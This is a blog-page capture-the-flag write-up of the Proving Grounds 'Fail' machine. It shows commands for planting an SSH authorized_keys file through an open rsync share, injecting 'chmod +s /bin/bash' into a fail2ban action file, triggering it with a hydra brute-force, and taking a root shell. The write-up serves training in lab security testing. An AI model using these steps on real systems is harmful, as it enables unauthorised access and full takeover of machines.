<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Fail - OSPG | Infomation Security - Blog</title><meta name="description" content="SummaryIn this writeup, we’ll acquire an initial access to the system via a misconfigured rsync share, which allows us to upload a .ssh key onto home directo...
    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Jay Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/fail-ospg/"><meta property="og:description" content="
    Blog"><meta property="og:title" content="Fail - OSPG
  "><link rel="canonical" href="https://jayngng.github.io/blog/fail-ospg/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">whoami</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">Fail - OSPG</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> August 19, 2021</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i>&nbsp;Tags:&nbsp; | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//ctf">ctf</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//pg">pg</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//linux">linux</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 6 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h1 id="summary"><strong>Summary</strong></h1><p>In this writeup, we’ll acquire an initial access to the system via a misconfigured <code class="language-plaintext highlighter-rouge">rsync</code> share, which allows us to upload a <code class="language-plaintext highlighter-rouge">.ssh</code> key onto home directory of user <code class="language-plaintext highlighter-rouge">fox</code>. We’ll then escalate privilge by abusing a <code class="language-plaintext highlighter-rouge">fail2ban</code> configuration file to trigger arbitrary commands of our choice.</p><hr><h1 id="attack-narrative"><strong>Attack Narrative</strong></h1><p>The attack is performed based upon three main phases:</p><ul><li>Enumeration.</li><li>Exploitation.</li><li>Privilege Escalation.</li></ul><p><br></p><h1 id="enumeration"><strong>Enumeration</strong></h1><p>We’ll begin with a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">--open</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-p-</span> <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nv">$IP</span>

PORT    STATE SERVICE REASON         VERSION                     
22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>              
| ssh-hostkey:                 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA<span class="o">=</span>
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
873/tcp open  rsync   syn-ack ttl 63 <span class="o">(</span>protocol version 31<span class="o">)</span>
</code></pre></div></div><ul><li><p>We discover two running services: <strong>SSH</strong> and <strong>Rsyn</strong>.</p></li><li><p>The <code class="language-plaintext highlighter-rouge">rsync</code> service will be the target of our investigations.</p></li></ul><h4 id="rsync"><strong>Rsync</strong></h4><p>Essentially, <code class="language-plaintext highlighter-rouge">rsync</code> or remote synchronization is a Unix-like service mainly for transferring and syncing files and directories between machines on the network.</p><p>Let’s us grab its banner and inspect if there is any interesting information.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nv</span> <span class="nv">$IP</span> 873                                              
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.118.126] 873 <span class="o">(</span>rsync<span class="o">)</span> open
@RSYNCD: 31.0
</code></pre></div></div><ul><li>The version is <code class="language-plaintext highlighter-rouge">31.0</code>. Yet, this is not a vulnerable version.</li></ul><h4 id="rsync-shares"><strong>Rsync</strong> Shares</h4><p>Further enumerating the service might reveals us all the shares that currently available for accessing.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nv</span> <span class="nv">$IP</span> 873
</code></pre></div></div><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(UNKNOWN) [192.168.118.126] 873 (rsync) open
@RSYNCD: 31.0  -&gt; Banner tells us version
@RSYNCD: 31.0  -&gt; We then send them the same info 
<span class="gh">#list  -&gt; Enumerate the server</span>
<span class="gs">**fox             fox home**</span>  -&gt; End enumeration
@RSYNCD: EXIT  -&gt; The server closes connection
</code></pre></div></div><p>The results indicate that <code class="language-plaintext highlighter-rouge">fox</code> module is available for sharing, and <code class="language-plaintext highlighter-rouge">fox home</code> is a description potentially implying the <code class="language-plaintext highlighter-rouge">home</code> directory of <code class="language-plaintext highlighter-rouge">fox</code> user.</p><p>Normally, <code class="language-plaintext highlighter-rouge">rsync</code> requires authentication to access the file share, let’s us check if we need to authenticate. This can be done by simply entering <code class="language-plaintext highlighter-rouge">fox</code>, which is the name of the module.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nv</span> <span class="nv">$IP</span> 873
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.118.126] 873 <span class="o">(</span>rsync<span class="o">)</span> open
@RSYNCD: 31.0
@RSYNCD: 31.0
fox
@RSYNCD: OK
</code></pre></div></div><p><code class="language-plaintext highlighter-rouge">@RSYNCD: OK</code> response means no authentication needed to access the share.</p><p>Now, we can list <code class="language-plaintext highlighter-rouge">fox</code> shares utilizing <code class="language-plaintext highlighter-rouge">rsync</code> utility:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rsync <span class="nt">-av</span> <span class="nt">--list-only</span> rsync://<span class="nv">$IP</span>/fox                                                                                                                                                 1 ⨯
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 09:21:59 <span class="nb">.</span>
lrwxrwxrwx              9 2020/12/03 15:22:42 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span>            220 2019/04/18 00:12:36 .bash_logout
<span class="nt">-rw-r--r--</span>          3,526 2019/04/18 00:12:36 .bashrc
<span class="nt">-rw-r--r--</span>            807 2019/04/18 00:12:36 .profile

sent 20 bytes  received 136 bytes  44.57 bytes/sec
total size is 4,562  speedup is 29.24
</code></pre></div></div><p>This works perfectly, we can choose to further investigate those files. However, <code class="language-plaintext highlighter-rouge">rsync</code> provides an ability to upload files onto the share module.</p><hr><h1 id="exploitation"><strong>Exploitation</strong></h1><p><br></p><h4 id="rsync-anonymous-upload"><strong>Rsync Anonymous Upload</strong></h4><p>Knowing that we can upload files via <code class="language-plaintext highlighter-rouge">rsync</code>, we could then try to upload a SSH <code class="language-plaintext highlighter-rouge">authorized_keys</code> onto the <code class="language-plaintext highlighter-rouge">fox</code> share and SSH our way in as <code class="language-plaintext highlighter-rouge">fox</code>.</p><p>The steps take to reproduce the attack:</p><ol><li>Create a SSH key.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh-keygen <span class="nt">-f</span> fox_ssh
Generating public/private rsa key pair.
...
</code></pre></div></div></li><li>Copy <code class="language-plaintext highlighter-rouge">fox_ssh.pub</code> to <code class="language-plaintext highlighter-rouge">authorized_keys</code>.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp </span>fox_ssh.pub authorized_keys
</code></pre></div></div></li><li>Upload the newly created <code class="language-plaintext highlighter-rouge">authorized_keys</code> onto the target share.</li></ol><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rsync <span class="nt">-av</span> authorized_keys rsync://<span class="nv">$IP</span>/fox/.ssh 
sending incremental file list
authorized_keys

sent 674 bytes  received 35 bytes  202.57 bytes/sec
total size is 564  speedup is 0.80
</code></pre></div></div><p>After the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file is uploaded, we are able to connect via SSH as <code class="language-plaintext highlighter-rouge">fox</code>.</p><hr><h1 id="privilege-escalation"><strong>Privilege Escalation</strong></h1><h4 id="fail2ban"><strong>Fail2ban</strong></h4><p>It’s worth to notice our <code class="language-plaintext highlighter-rouge">fox</code> user is in the <code class="language-plaintext highlighter-rouge">fail2ban</code> group, and the <code class="language-plaintext highlighter-rouge">fail2ban</code> service is executed by <code class="language-plaintext highlighter-rouge">root</code> .</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fox@fail:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>fox<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>fox<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>fox<span class="o">)</span>,1000<span class="o">(</span>fail2ban<span class="o">)</span>
</code></pre></div></div><p>Any user belonging to the <code class="language-plaintext highlighter-rouge">fail2ban</code> group is able to modify the <code class="language-plaintext highlighter-rouge">fail2ban</code> configuration files. In order to achieve privilege escalation, we are particularly interested in the <code class="language-plaintext highlighter-rouge">/etc/fail2ban/action.d/iptables-multiport.conf</code> file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fox@fail:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /etc/fail2ban/action.d/iptables-multiport.conf
<span class="nt">-rw-rw-r--</span> 1 root fail2ban 1440 Aug 18 19:43 /etc/fail2ban/action.d/iptables-multiport.conf
</code></pre></div></div><p>The <code class="language-plaintext highlighter-rouge">iptables-multiport.conf</code> file enacts <strong>ban-action</strong> laws. Basically, it manipulates the <code class="language-plaintext highlighter-rouge">iptables</code> to ban any IP address that break the law by <strong>executing specific commands</strong>.</p><h4 id="fail2ban-abuse"><strong>Fail2ban</strong> Abuse</h4><p>Since we have <strong>write</strong> permission of the file <code class="language-plaintext highlighter-rouge">iptables-multiport.conf</code>, we should be able to control which command to run when the <code class="language-plaintext highlighter-rouge">fail2ban</code> is triggered.</p><p>All our jobs now are injecting a desired command that we want to be run by <code class="language-plaintext highlighter-rouge">root</code>, and triggering the <code class="language-plaintext highlighter-rouge">fail2ban</code> service.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nano /etc/fail2ban/action.d/iptables-multiport.conf

<span class="o">[</span>...]
actionunban <span class="o">=</span> &lt;iptables&gt; <span class="nt">-D</span> f2b-&lt;name&gt; <span class="nt">-s</span> &lt;ip&gt; <span class="nt">-j</span> &lt;blocktype&gt;
                <span class="nb">chmod</span> +s /bin/bash
<span class="o">[</span>Init]
</code></pre></div></div><p>The command that we inject will grant <code class="language-plaintext highlighter-rouge">/bin/bash</code> a SUID permission.</p><p>Then we trigger <code class="language-plaintext highlighter-rouge">fail2ban</code> to execute our command by brute-forcing the SSH.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hydra <span class="nt">-l</span> fox <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt ssh://<span class="nv">$IP</span>

<span class="o">[</span>...]
<span class="o">[</span>DATA] attacking ssh://192.168.118.126:22/
<span class="o">[</span>ERROR] ssh target does not support password auth
</code></pre></div></div><p>After a few tries, we are banned by <code class="language-plaintext highlighter-rouge">fail2ban</code>, which indicates that our injected command should be triggered.</p><p>Now, if we inspect the <code class="language-plaintext highlighter-rouge">/bin/bash</code> file, we can see that it’s dressed up with a SUID bit.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fox@fail:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /bin/bash
<span class="nt">-rwsr-sr-x</span> 1 root root 1168776 Apr 18  2019 /bin/bash
</code></pre></div></div><p>Perfectly, we can then drop our <code class="language-plaintext highlighter-rouge">root</code> shell by executing the following command:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fox@fail:~<span class="nv">$ </span>/bin/bash <span class="nt">-p</span>
bash-5.0# <span class="nb">whoami
</span>root
</code></pre></div></div><p>and become <code class="language-plaintext highlighter-rouge">root</code>!.</p><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security © 2021-2021 • All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with&nbsp;<a href="https://jekyllrb.com" target="_blank">Jekyll</a>&nbsp;using&nbsp;<a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a>&nbsp;Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>